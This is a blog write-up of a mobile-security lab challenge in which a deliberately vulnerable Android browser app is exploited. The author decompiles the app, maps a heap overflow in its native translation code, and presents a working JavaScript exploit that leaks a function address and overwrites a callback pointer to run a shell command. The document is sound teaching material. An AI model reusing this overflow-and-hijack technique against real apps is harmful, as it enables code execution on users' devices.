---
title: Translate Me - Mobile Hacking Lab
date: 2025-7-2 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---



<br />

**Introduction**

Welcome to the Android Application Security Lab: Translate Me Android Buffer Overflow Challenge. In this challenge, you'll explore a browser focused on providing real time translations. While the app is still in development, it seems the developers were in a hurry to deliver leaving behind a serious overflow vulnerability! Your goal is to investigate the browser, identify the issues, and understand how they can be leveraged to execute functions to reach command execution.

<br />

**Objective**

- **Investigate the Overflow**: Analyze the Translate Me browser to identify potential security weaknesses emerging from memory corruption.
- **Demonstrate Exploitation**: Craft an exploit to reach command execution.

<br />

**Explore the application**

The application contains a WebView component which allows users to navigate to and load external URLs

![](/assets/img/mhl/TranslateMe/1.png)

<br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>

    <activity
        android:theme="@style/Theme.TranslateMe"
        android:label="@string/app_name"
        android:name="com.mobilehackinglab.translateme.BrowserActivity"
        android:exported="true"
        android:configChanges="screenSize|orientation|keyboardHidden">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
        <intent-filter>
            <action android:name="android.intent.action.VIEW"/>
            <category android:name="android.intent.category.DEFAULT"/>
            <category android:name="android.intent.category.BROWSABLE"/>
            <data android:scheme="http"/>
            <data android:scheme="https"/>
        </intent-filter>
    </activity>
    <activity
        android:theme="@style/Theme.TranslateMe"
        android:name="com.mobilehackinglab.translateme.MainActivity"
        android:exported="false"/>
```

**Permissions Granted**:

- `WRITE_EXTERNAL_STORAGE` - We can write files to /sdcard/ (proof of exploitation)
- `READ_EXTERNAL_STORAGE` - We can read files from device

**Attack Surface**:

- `BrowserActivity` is **exported** (`android:exported="true"`)
- Accepts **web links** (`http://`, `https://` via intent filters)
- Contains **BROWSABLE** category, can be triggered from web browsers

<br />

From: com.mobilehackinglab.translateme.BrowserActivity

```java
public class BrowserActivity extends Activity {
 protected void onCreate(Bundle savedInstanceState) {
        final String urlToLoad;
        super.onCreate(savedInstanceState);
        RelativeLayout mainLayout = new RelativeLayout(this);
        mainLayout.setBackgroundColor(getResources().getColor(R.color.white));
        createToolbar(mainLayout);
        createBrowserContent(mainLayout);
        setContentView(mainLayout);
        if (getIntent() != null && getIntent().getData() != null) {
            urlToLoad = getIntent().getData().toString();
            Log.d("BrowserActivity", "Deep link received: " + urlToLoad);
        } else if (getIntent() != null && getIntent().hasExtra("url")) {
            urlToLoad = getIntent().getStringExtra("url");
            Log.d("BrowserActivity", "URL from intent extras: " + urlToLoad);
        } else {
            urlToLoad = null;
        }
        if (urlToLoad != null) {
            Log.d("BrowserActivity", "Loading deep link URL: " + urlToLoad);
            this.webView.post(new Runnable() { // from class: com.mobilehackinglab.translateme.BrowserActivity$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    BrowserActivity.this.m54x5838a25d(urlToLoad);
                }
            });
        } else {
            this.webView.post(new Runnable() { // from class: com.mobilehackinglab.translateme.BrowserActivity$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    BrowserActivity.this.m55x49e2487c();
                }
            });
        }
    }

    private void createBrowserContent(RelativeLayout parent) {
        LinearLayout webViewContainer = new LinearLayout(this);
        webViewContainer.setOrientation(1);
        webViewContainer.setBackgroundColor(getResources().getColor(R.color.white));
        RelativeLayout.LayoutParams webViewParams = new RelativeLayout.LayoutParams(-1, -1);
        webViewParams.addRule(3, this.toolbar.getId());
        webViewParams.addRule(12);
        parent.addView(webViewContainer, webViewParams);
        this.webView = new WebView(this);
        this.webView.getSettings().setJavaScriptEnabled(true);
        this.webView.getSettings().setDomStorageEnabled(true);
        this.webView.getSettings().setAllowFileAccess(true);
        this.webView.getSettings().setAllowContentAccess(true);
        this.webView.getSettings().setLoadWithOverviewMode(true);
        this.webView.getSettings().setUseWideViewPort(true);
        this.webView.getSettings().setBuiltInZoomControls(true);
        this.webView.getSettings().setDisplayZoomControls(false);
        this.webView.getSettings().setSupportZoom(true);
        this.webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        this.webView.getSettings().setMixedContentMode(0);
        this.webView.getSettings().setCacheMode(2);
        this.webView.getSettings().setDatabaseEnabled(true);
        this.webView.getSettings().setGeolocationEnabled(true);
        this.webView.getSettings().setBlockNetworkImage(false);
        this.webView.getSettings().setBlockNetworkLoads(false);
        this.webView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36");
    }
}
```

<br />

- App can be triggered via **http/https URLs** (deep links)
- Can also be triggered via **intents with "url" extra**

<br />

**WebView Security Misconfigurations**

1. **JavaScript Enabled** 
   - WebView can execute JavaScript code
   - JavaScript can call exposed Java methods via `@JavascriptInterface`
2. **File Access Allowed**
   - WebView can read local files via `file://` URLs
   - JavaScript can access device storage
   - Can read sensitive app data
3. **No Content Security Policy**
4. **No URL filtering**
   - Can load `http://` URLs (unencrypted)
   - Can load malicious domains
   - Can load local files with sensitive data
   - No domain whitelist/blacklist

<br />

To demonstrate that the app’s exported `BrowserActivity` accepts external URLs, I launched it from ADB and loaded `https://google.com`:

```
adb shell am start -n com.mobilehackinglab.translateme/.BrowserActivity --es url https://google.com
```

<br />

We can also load local files. For example, opening `/etc/hosts`:

```
adb shell am start -n com.mobilehackinglab.translateme/.BrowserActivity --es url file:///etc/hosts
```

![](/assets/img/mhl/TranslateMe/2.png)

<br />

From: com.mobilehackinglab.translateme.TranslatorBridge

```java
public class TranslatorBridge {
    private static final String TAG = "TranslatorBridge";
    public native long getSafeExecutePtr();
    public native long leakFunctionPtr();
    public native int testPayload(byte[] bArr, int i);
    public native void translateContentBytes(byte[] bArr);

    static {
        try {
            System.loadLibrary("translator");
            Log.d(TAG, "Native library loaded successfully");
        } catch (Exception e) {
            Log.e(TAG, "Unexpected error loading native library: " + e.getMessage());
            e.printStackTrace();
        } catch (UnsatisfiedLinkError e2) {
            Log.e(TAG, "Failed to load native library: " + e2.getMessage());
            e2.printStackTrace();
        }
    }

    @JavascriptInterface
    public void translatePageBytes(String contentStr) {
        byte[] content = contentStr.getBytes(StandardCharsets.ISO_8859_1);
        Log.d(TAG, "translatePageBytes called with content length: " + content.length);
        try {
            Log.d(TAG, "About to call translateContentBytes native method");
            translateContentBytes(content);
            Log.d(TAG, "Translation completed successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error during translation: " + e.getMessage());
            e.printStackTrace();
        }
    }

    @JavascriptInterface
    public long getFunctionPointer() {
        Log.d(TAG, "getFunctionPointer called");
        try {
            Log.d(TAG, "About to call leakFunctionPtr native method");
            long result = leakFunctionPtr();
            Log.d(TAG, "leakFunctionPtr returned: " + result);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Error leaking function pointer: " + e.getMessage());
            e.printStackTrace();
            return 0L;
        }
    }

    @JavascriptInterface
    public long getSafeExecuteAddress() {
        Log.d(TAG, "getSafeExecuteAddress called");
        try {
            Log.d(TAG, "About to call getSafeExecutePtr native method");
            long result = getSafeExecutePtr();
            Log.d(TAG, "getSafeExecutePtr returned: " + result);
            return result;
        } catch (Exception e) {
            Log.e(TAG, "Error getting safe_execute_command address: " + e.getMessage());
            e.printStackTrace();
            return 0L;
        }
    }
}
```

A Java “bridge” that loads a native library (`translator`) and exposes a few **JNI** entry points to JavaScript running inside a WebView via `@JavascriptInterface`.

`@JavascriptInterface` methods allow web content in the app’s WebView to call:

- `translatePageBytes(string)` → converted to ISO-8859-1 bytes and forwarded to native `translateContentBytes(byte[])`.
- `getFunctionPointer()` and `getSafeExecuteAddress()` → return native addresses to JS (and log them).



<br />

**The native functions exposed through JNI**

`translateContentBytes` fetches a length and a source pointer from external callbacks, allocates `iVar1+1` bytes based on that untrusted length, then performs an unchecked copy of `iVar1` bytes using a `_chk` wrapper that is effectively disabled (it’s passed `SIZE_MAX`). It also writes a terminating NULL at `buf[iVar1]` and hands the buffer to `translate()` for further processing. Because the function trusts a caller-supplied length and pointer and does no bounds or overflow checks, oversized or inconsistent inputs can overflow the allocated heap buffer.



![](/assets/img/mhl/TranslateMe/5.png)

1. `iVar1 = (**(code **)(*param_1 + 0x558))(param_1,param_3);`
    Calls into a provider to get an **integer length** for the data.
2. `lVar2 = (**(code **)(*param_1 + 0x5c0))(param_1,param_3,0);`
    Calls another provider to get a **pointer (address)** to the input bytes.
3. Logs the reported length. If `lVar2 == 0` it returns (no-op).
4. `__ptr = malloc((long)(iVar1 + 1));`
    Allocates memory sized from the untrusted `iVar1` value.
5. `__memcpy_chk(__ptr,lVar2,(long)iVar1,0xffffffffffffffff);`
    Copies **`iVar1` bytes** from the source pointer into the new buffer. Note: the `_chk` call is passed `SIZE_MAX` (`0xffff...`), which disables the runtime bounds check.
6. `*(undefined1 *)((long)__ptr + (long)iVar1) = 0;`
    Writes a NUL at `buf[iVar1]`.
7. Logs and calls `translate(__ptr)` then frees the buffer and calls a cleanup callback.



<br />

The `translate()` function allocates a heap object containing a 64-byte data buffer with a function pointer stored immediately after it, then copies an attacker-controlled string into that buffer **without enforcing any bounds** and later dereferences the stored pointer. Because the copy can spill past the 64-byte buffer and overwrite the adjacent pointer, and because the function will call whatever pointer value it finds (unless it’s the original or NULL), this pattern creates a serious memory-corruption risk that can lead to control-flow hijacking when combined with address leaks or other app-level exposures. 

![](/assets/img/mhl/TranslateMe/3.png)

<br />

**Memory Layout**

The vulnerable structure allocated with `malloc(0x148)` has this layout:

```
+----------------+ 0x00  - Start of allocated chunk
| 64-byte buffer |        // User input copied here
+----------------+ 0x40  
| callback ptr   |        // Function pointer at offset 0x40
+----------------+ 0x48
| ...            |        // Remaining space (0x100 bytes)
+----------------+ 0x148 - End of allocated chunk





malloc(0x148) → base = __ptr

Offset  Size   Purpose
------  -----  -----------------------------------------
0x00    0x40   [BUFFER] 64-byte zeroed region (memset)
0x40    0x08   [CALLBACK] function pointer
0x48    ...    (unused here / padding / other fields)
```

The code explicitly tells us the important offsets:

- “Buffer offset: 0”
- “Callback offset: 0x40”

It sets the callback at `*(code **)(base + 0x40) = dummy_function;`

Then it clears **only the first 0x40 bytes**: `memset(base, 0, 0x40)`, so the buffer is zeroed, the callback remains whatever was just written.

<br />

**The unsafe copy (where overflow happens)**

```c
uVar2 = __strlen_chk(param_1, 0xffffffffffffffff);
__memcpy_chk(base, param_1, uVar2, 0xffffffffffffffff);
```

Two problems at once:

1. **Unbounded length**
    `uVar2` is the full length of `param_1` . There is **no check** that `uVar2 ≤ 0x40` (the buffer capacity).
   - `__strlen_chk` with size `-1` = no bounds checking
   - `__memcpy_chk` with size `-1` = no bounds checking
   - If `uVar2 > 0x40`, the copy writes past the 64-byte buffer.
2. **Because the Fortify wrapper is given a bogus (maximal) object size, its bounds-checking is completely bypassed.**
    Passing `0xffffffffffffffff` to the `_chk` variants effectively disables the object-size fortify check, so the runtime can’t catch an oversized copy.

For further details on Fortify, see the explanation provided [here](#Bonus).



**When does overflow begin?**

- Safe region: offsets `0x00 .. 0x3F` (64 bytes).
- First byte beyond the buffer is at **offset `0x40`** which is **exactly** the first byte of the **callback** pointer.

So:

- If `uVar2 ≤ 64` → no overflow.
- If `uVar2 ≥ 65` → at least 1 byte of the callback is overwritten.

**Note:** To overwrite **all 8 bytes** of the callback pointer on a 64-bit build, you’d need **at least 72 bytes** (`64 + 8`) copied.

<br />

**The Overflow Mechanism**

If the input string is longer than 64 bytes:

```
Input: "AAA...AAA" + [8-byte address] + "remaining data..."
       ↑           ↑                  ↑
       64 bytes    Overflow starts    Continues past buffer
```



The memory corruption occurs like this:

```
Before overflow:
[64-byte buffer][dummy_function ptr][...]

After overflow with 72+ byte input:
[input data...][OVERWRITTEN ptr][...]
 ↑             ↑
 64 bytes      0x40 offset
```



<br />

**What the follow-up logic does (why control can be seized)**

After the copy, the function **checks the callback field**:

```c
if ( *(ptr+0x40) == 0 || *(ptr+0x40) == dummy_function ) {
    // "overflow failed" / "callback is NULL"
} else {
    // "Callback was overwritten! Calling at: %p"
    ((func *)(ptr+0x40))(param_1);
}
```

This is unusually revealing:

- If the pointer is **neither NULL nor the original `dummy_function`**, the code **assumes it was overwritten** and **calls it**.
- That means any value different from those two “safe” values will be **dereferenced as a function pointer** and **executed** with `param_1` as its argument (you can see the log “String parameter in x0” hinting at AArch64 register `x0`).

<br />

**Summary of relevant numerical values**

- Buffer capacity: **64 bytes** (`0x40`).
- Callback pointer location: **bytes 64–71** (`0x40..0x47`).
- Copy length: **`uVar2 = strlen(param_1)`** (unbounded).
- **Overflow starts at** `uVar2 ≥ 65`.
- **Complete callback overwrite by** `uVar2 ≥ 72`.
- Everything beyond 72 spills further into the structure.

<br />

**End-to-end flow (buffer-overflow to RCE)**

1. Allocate `0x148` bytes.
2. Initialize the function pointer at `+0x40` to a benign routine.
3. Zero the first 64 bytes only.
4. Copy **`strlen(param_1)` bytes** into the 64-byte buffer at offset 0, **no bound check**.
5. If more than 64 bytes are copied, the write **spills into the function pointer** at `+0x40`.
6. If the function pointer value is now **non-NULL and not `dummy_function`**, invoke it → **arbitrary indirect call**.

<br />

**heap buffer overflow → function-pointer hijack → code execution**



<br />

`safe_execute_command` logs its string argument and the function’s address, then if the argument is non-NULL, it passes that string straight to `system()` which runs it in a shell. Because it both accepts and logs an arbitrary string and prints internal addresses. If an attacker can control the pointer or the string passed to it (directly or by corrupting a function pointer to point here), they can execute arbitrary shell commands with the app’s privileges; the logged addresses also help an attacker bypass ASLR.

![](/assets/img/mhl/TranslateMe/4.png)

<br />

The APK’s `assets/index.html` contains numerous functions useful for identifying and exploiting the vulnerability. One of them is `testOverflow`. I sent a payload of 64 `"A"` characters.

![](/assets/img/mhl/TranslateMe/8.png)

<br />

```javascript
// Test heap overflow with large payload
function testOverflow() {
    try {
        // Create a payload that's larger than the 64-byte buffer
        var payload = "A".repeat(64);
        TranslatorBridge.translatePage(payload);
        alert("Overflow test completed");
    } catch (e) {
        alert("Error: " + e.message);
    }
}
```

<br />

**Payload length = 64**

- Logs show the copy happened and the callback remained `dummy_function` (`After memcpy - callback: 0x7fff53677310`). 
- Copying 64 bytes did **not** change the stored callback pointer in this run, the data fit the buffer region 

```
translatePage called with content length: 64
11-10 12:26:52.001  5360  5443 D TranslatorBridge: About to call translateContent native method
11-10 12:26:52.001  5360  5443 D TranslateMe: translateContent called with input length: 64
11-10 12:26:52.001  5360  5443 D TranslateMe: translate called with: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
11-10 12:26:52.001  5360  5443 D TranslateMe: translate address: 0x7fff53677360
11-10 12:26:52.001  5360  5443 D TranslateMe: PID: 5360
11-10 12:26:52.001  5360  5443 D TranslateMe: Vulnerable structure allocated at: 0x7fff6a7d4500
11-10 12:26:52.001  5360  5443 D TranslateMe: Structure size: 328 bytes
11-10 12:26:52.001  5360  5443 D TranslateMe: Buffer offset: 0
11-10 12:26:52.001  5360  5443 D TranslateMe: Callback offset: 64
11-10 12:26:52.001  5360  5443 D TranslateMe: Debug symbol: 0xdeadbabe
11-10 12:26:52.001  5360  5443 D TranslateMe: Initial callback: 0x7fff53677310
11-10 12:26:52.001  5360  5443 D TranslateMe: After memcpy - callback: 0x7fff53677310
11-10 12:26:52.001  5360  5443 D TranslateMe: Callback still points to dummy_function - overflow failed
11-10 12:26:52.001  5360  5443 D TranslatorBridge: Translation completed successfully
```

<br />

**Payload length = 100**

- Logs show `After memcpy - callback: 0x4141414141414141` and then `Callback was overwritten! Calling at: 0x4141414141414141`.

- `0x41` is ASCII `'A'`. Seeing `0x4141414141414141` means the 8-byte function pointer was completely overwritten with the repeated `'A'` byte pattern.

- Immediately after that, the code attempted to call the pointer (hence the log line showing the string parameter in `x0`), which is an attempt to transfer execution to address `0x4141414141414141` almost certainly invalid and would lead to a crash or SIGSEGV.

```
11-10 13:51:17.344  6097  6185 D TranslatorBridge: translatePage called with content length: 100
11-10 13:51:17.344  6097  6185 D TranslatorBridge: About to call translateContent native method
11-10 13:51:17.344  6097  6185 D TranslateMe: translateContent called with input length: 100
11-10 13:51:17.344  6097  6185 D TranslateMe: translate called with: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
11-10 13:51:17.344  6097  6185 D TranslateMe: translate address: 0x7fff4d569360
11-10 13:51:17.344  6097  6185 D TranslateMe: PID: 6097
11-10 13:51:17.344  6097  6185 D TranslateMe: Vulnerable structure allocated at: 0x7fff72841a80
11-10 13:51:17.344  6097  6185 D TranslateMe: Structure size: 328 bytes
11-10 13:51:17.344  6097  6185 D TranslateMe: Buffer offset: 0
11-10 13:51:17.344  6097  6185 D TranslateMe: Callback offset: 64
11-10 13:51:17.344  6097  6185 D TranslateMe: Debug symbol: 0xdeadbabe
11-10 13:51:17.344  6097  6185 D TranslateMe: Initial callback: 0x7fff4d569310
11-10 13:51:17.344  6097  6185 D TranslateMe: After memcpy - callback: 0x4141414141414141
11-10 13:51:17.344  6097  6185 D TranslateMe: Callback was overwritten! Calling at: 0x4141414141414141
11-10 13:51:17.344  6097  6185 D TranslateMe: String parameter in x0: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

<br />

The logs I got when I ran `getSafeExecuteAddress()`.

```
11-10 12:34:35.862  5535  5609 D TranslatorBridge: getSafeExecuteAddress called
11-10 12:34:35.862  5535  5609 D TranslatorBridge: About to call getSafeExecutePtr native method
11-10 12:34:35.862  5535  5609 D TranslateMe: Leaking safe_execute_command address: 0x7fff4d37b240
11-10 12:34:35.862  5535  5609 D TranslateMe: safe_execute_command as integer: 140734488883776
11-10 12:34:35.862  5535  5609 D TranslateMe: safe_execute_command as hex: 0x7fff4d37b240
11-10 12:34:35.862  5535  5609 D TranslateMe: safe_execute_command debug symbol: 0xdeadcafe
11-10 12:34:35.862  5535  5609 D TranslateMe: PID: 5535
11-10 12:34:35.862  5535  5609 D TranslateMe: Address size: 8 bytes
11-10 12:34:35.862  5535  5609 D TranslatorBridge: getSafeExecutePtr returned: 140734488883776
```

These log entries show that calling `getSafeExecuteAddress()` results in the native code directly leaking the address of `safe_execute_command`. The function prints the pointer in multiple formats (raw pointer, integer, hex) along with process information, confirming that an attacker can obtain a precise code address in memory. Since `safe_execute_command` ultimately invokes `system()` with user-controlled input, exposing its address significantly lowers the bar for control-flow hijacking by removing ASLR as a defense.

<br />

The provided `index.html` includes a call to `exploit.js`. 

```javascript
// Load exploit script
var script = document.createElement('script');
script.src = 'exploit.js';
document.head.appendChild(script);
```

<br />

I will modify the page to add a button that exploits the buffer-overflow vulnerability and implement the triggering code inside `exploit.js`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>TranslateMe Test Page</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f0f0f0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .test-section {
            margin: 20px 0;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }
        button:hover {
            background: #0056b3;
        }
        .payload {
            background: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>TranslateMe Browser Test Page</h1>
        <p>This page tests the vulnerable translation functionality.</p>
        
        <div class="test-section">
            <h3>Manual Test</h3>
            <p>Click the button to test the translation function:</p>
            <button onclick="testTranslation()">Test Translation</button>
            <button onclick="testOverflow()">Test Heap Overflow</button>
            <button onclick="leakAddress()">Leak Function Address</button>
            <button onclick="TranslateMeExploit()">Run Translate Me Exploit</button>
        </div>
        
        <div class="test-section">
            <h3>Automatic Test</h3>
            <p>This will automatically trigger the vulnerable function:</p>
            <div class="payload" id="payload"></div>
            <button onclick="runAutoTest()">Run Auto Test</button>
        </div>
        
        <div class="test-section">
            <h3>Exploit Development</h3>
            <p>For CTF exploitation:</p>
            <button onclick="generateExploit()">Generate Exploit Payload</button>
            <div id="exploit-output"></div>
        </div>
    </div>

    <script>
        // Test basic translation
        function testTranslation() {
            try {
                TranslatorBridge.translatePage("Hello World");
                alert("Translation test completed");
            } catch (e) {
                alert("Error: " + e.message);
            }
        }
        
        // Test heap overflow with large payload
        function testOverflow() {
            try {
                // Create a payload that's larger than the 64-byte buffer
                var payload = "A".repeat(100);
                TranslatorBridge.translatePage(payload);
                alert("Overflow test completed");
            } catch (e) {
                alert("Error: " + e.message);
            }
        }
        
        // Leak function address for ASLR bypass
        function leakAddress() {
            try {
                var addr = TranslatorBridge.getFunctionPointer();
                alert("Function address: 0x" + addr.toString(16));
            } catch (e) {
                alert("Error: " + e.message);
            }
        }
        
        // Generate exploit payload
        function generateExploit() {
            var output = document.getElementById('exploit-output');
            output.innerHTML = `
                <h4>Exploit Development Steps:</h4>
                <ol>
                    <li>Use TranslatorBridge.getFunctionPointer() to leak addresses</li>
                    <li>Calculate base address of libtranslator.so</li>
                    <li>Find address of execute_command function</li>
                    <li>Create payload to overflow buffer and overwrite function pointer</li>
                    <li>Call TranslatorBridge.translatePage(exploit_payload)</li>
                    <li>Function pointer should point to execute_command</li>
                    <li>Execute: cat /data/data/local/tmp/flag.txt > /sdcard/flag.txt</li>
                </ol>
                <p><strong>Target:</strong> Heap overflow in translate_content() function</p>
                <p><strong>Goal:</strong> Execute system command to read flag</p>
            `;
        }
        
        // Auto-run test on page load
        window.onload = function() {
            console.log("Page loaded, running auto test...");
            
            // Load exploit script
            var script = document.createElement('script');
            script.src = 'exploit.js';
            document.head.appendChild(script);
        };
    </script>
</body>
</html> 
```

<br />

exploit.js

```javascript
function TranslateMeExploit() {
    try {
        let safeExecuteAddr = TranslatorBridge.getSafeExecuteAddress();
        console.log("Target address: 0x" + safeExecuteAddr.toString(16));
        
        // CORRECT PAYLOAD STRUCTURE:
        // [COMMAND][PADDING][TARGET ADDRESS]
        let payload = '';
        
        // 1. FIRST: The command that will be passed to safe_execute_command
        payload += "touch /sdcard/pwnd.txt;#";
        
        // 2. THEN: Padding to reach the function pointer at offset 0x40
        // We need enough padding so that the address lands exactly at offset 0x40
        let currentLength = payload.length;
        let paddingNeeded = 64 - currentLength;
        
        if (paddingNeeded > 0) {
            for (let i = 0; i < paddingNeeded; i++) {
                payload += 'A';  // Padding bytes
            }
        }
        
        // 3. LAST: Overwrite the function pointer at offset 0x40
        let addr = safeExecuteAddr;
        for (let i = 0; i < 8; i++) {
            payload += String.fromCharCode(addr & 0xFF);
            addr = Math.floor(addr / 256);
        }
        
        console.log("Final payload length: " + payload.length);
        console.log("Command: 'touch /sdcard/pwnd.txt'");
        console.log("Padding: " + (64 - "touch /sdcard/pwnd.txt;#".length) + " bytes");
        console.log("Address: 0x" + safeExecuteAddr.toString(16));
        
        // Trigger the exploit
        TranslatorBridge.translatePageBytes(payload);
        
    } catch (e) {
        console.log("Exploit failed: " + e);
    }
}
```

The script constructs a single long string made of three parts,  a command string, padding to fill a fixed-size native buffer, and an 8-byte value intended to overwrite a nearby pointer, then sends that string through the app’s Java → native bridge. If the native code blindly copies the whole string into a 64-byte buffer that sits immediately before a function pointer, the excess bytes will overwrite that pointer. Because the program later reads and calls that pointer, this creates a path from a data write to arbitrary code execution.

<br />

![](/assets/img/mhl/TranslateMe/7.png)

<br />

Logs:

```
11-10 19:37:41.641  4911  4988 D TranslatorBridge: getSafeExecuteAddress called
11-10 19:37:41.641  4911  4988 D TranslatorBridge: About to call getSafeExecutePtr native method
11-10 19:37:41.641  4911  4988 D TranslateMe: Leaking safe_execute_command address: 0x7fff54f45240
11-10 19:37:41.641  4911  4988 D TranslateMe: safe_execute_command as integer: 140734618686016
11-10 19:37:41.641  4911  4988 D TranslateMe: safe_execute_command as hex: 0x7fff54f45240
11-10 19:37:41.641  4911  4988 D TranslateMe: safe_execute_command debug symbol: 0xdeadcafe
11-10 19:37:41.641  4911  4988 D TranslateMe: PID: 4911
11-10 19:37:41.641  4911  4988 D TranslateMe: Address size: 8 bytes
11-10 19:37:41.641  4911  4988 D TranslatorBridge: getSafeExecutePtr returned: 140734618686016
11-10 19:37:41.642  4911  4911 I chromium: [INFO:CONSOLE(13)] "Target address: 0x7fff54f45240"
11-10 19:37:41.642  4911  4911 I chromium: [INFO:CONSOLE(40)] "Final payload length: 72"
11-10 19:37:41.642  4911  4911 I chromium: [INFO:CONSOLE(41)] "Command: 'touch /sdcard/pwnd.txt'"
11-10 19:37:41.642  4911  4911 I chromium: [INFO:CONSOLE(42)] "Padding: 40 bytes"
11-10 19:37:41.642  4911  4911 I chromium: [INFO:CONSOLE(43)] "Address: 0x7fff54f45240"
11-10 19:37:41.643  4911  4988 D TranslatorBridge: translatePageBytes called with content length: 72
11-10 19:37:41.643  4911  4988 D TranslatorBridge: About to call translateContentBytes native method
11-10 19:37:41.643  4911  4988 D TranslateMe: translateContentBytes called with input length: 72
11-10 19:37:41.643  4911  4988 D TranslateMe: Binary data copied, length: 72
11-10 19:37:41.643  4911  4988 D TranslateMe: translate called with: touch /sdcard/pwnd.txt;#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@R�T�
11-10 19:37:41.643  4911  4988 D TranslateMe: translate address: 0x7fff54f45360
11-10 19:37:41.643  4911  4988 D TranslateMe: PID: 4911
11-10 19:37:41.643  4911  4988 D TranslateMe: Vulnerable structure allocated at: 0x7fff6c062300
11-10 19:37:41.643  4911  4988 D TranslateMe: Structure size: 328 bytes
11-10 19:37:41.643  4911  4988 D TranslateMe: Buffer offset: 0
11-10 19:37:41.643  4911  4988 D TranslateMe: Callback offset: 64
11-10 19:37:41.643  4911  4988 D TranslateMe: Debug symbol: 0xdeadbabe
11-10 19:37:41.643  4911  4988 D TranslateMe: Initial callback: 0x7fff54f45310
11-10 19:37:41.643  4911  4988 D TranslateMe: After memcpy - callback: 0x7fff54f45240
11-10 19:37:41.643  4911  4988 D TranslateMe: Callback was overwritten! Calling at: 0x7fff54f45240
11-10 19:37:41.643  4911  4988 D TranslateMe: String parameter in x0: touch /sdcard/pwnd.txt;#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@R�T�
11-10 19:37:41.643  4911  4988 D TranslateMe: safe_execute_command called with: touch /sdcard/pwnd.txt;#AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@R�T�
11-10 19:37:41.643  4911  4988 D TranslateMe: safe_execute_command address: 0x7fff54f45240
11-10 19:37:41.643  4911  4988 D TranslateMe: Debug symbol: 0xdeadcafe
11-10 19:37:41.650  4911  4988 D TranslateMe: Command executed successfully
11-10 19:37:41.650  4911  4988 D TranslateMe: Callback executed successfully
11-10 19:37:41.650  4911  4988 D TranslatorBridge: Translation completed successfully
```

<br />

Verify exploitation success by demonstrating that `/sdcard/pwnd.txt` exists on the device.

![](/assets/img/mhl/TranslateMe/6.png)

<br />

<br />

---

#### Bonus

**Fortify check** (often called *_FORTIFY_SOURCE* / “fortify”) is a lightweight compile-time + runtime instrumentation that adds automatic bounds checks around common unsafe C library functions (like `memcpy`, `strcpy`, `sprintf`, etc.).

- **`-D_FORTIFY_SOURCE=1` or `=2`**
   When you compile with `-O` and `-D_FORTIFY_SOURCE=2`, the compiler (gcc/clang) replaces certain calls to unsafe functions with safer wrappers or builtin intrinsics when it can determine the destination size.
- **`__builtin_object_size()`**
   The compiler uses this builtin to figure out the size of the destination object at compile time (or sometimes at link time). If the size is known and the call would overflow, the compiler can either emit a compile-time warning/error or replace the call with a safer check.
- **`\*_chk` runtime wrappers**
   When compile-time info is incomplete, the compiler emits calls to helper functions like `__memcpy_chk` which take the destination size as an extra argument. At runtime these helpers compare the requested copy length to the provided destination size and abort if the copy would overflow.
- **Optimization requirement**
   Fortify needs optimization enabled (e.g., `-O2`) so the compiler can reason about object sizes and insert the checks.

<br />

**Example**

```c
char buf[16];
memcpy(buf, src, n);
```

With fortify, the compiler may generate:

```c
__memcpy_chk(buf, src, n, __builtin_object_size(buf, 0));
```

At runtime, `__memcpy_chk` tests whether `n > object_size`. If yes, abort (usually `__chk_fail()`), preventing an overflow.

<br />

**What it catches and what it can’t**

**Good at:**

- Catching obvious overflows when destination size is known at compile-time (e.g., fixed arrays).
- Preventing many common mistakes without changing source logic.

**Limitations / bypasses:**

- If the compiler **cannot** determine object size (heap buffer from `malloc`, pointer arithmetic, casts, or when `__builtin_object_size` returns -1), the check is weaker or the compiler emits a `_chk` call with whatever size it could determine (sometimes `-1` or `SIZE_MAX`).
- If the code or compiler emits `__memcpy_chk(dst, src, n, (size_t)-1)` or passes a bogus large size, the runtime check is effectively disabled.
- If you compile without optimization or without `_FORTIFY_SOURCE`, these checks are not inserted.
- Variadic functions, mismatched argument types, or using `memcpy` via an indirect call may prevent fortify from working.
- Fortify doesn’t eliminate the need for explicit bounds checking, it’s defense-in-depth.

<br />

**Why the check can be disabled (and how attackers/bugs exploit that)**

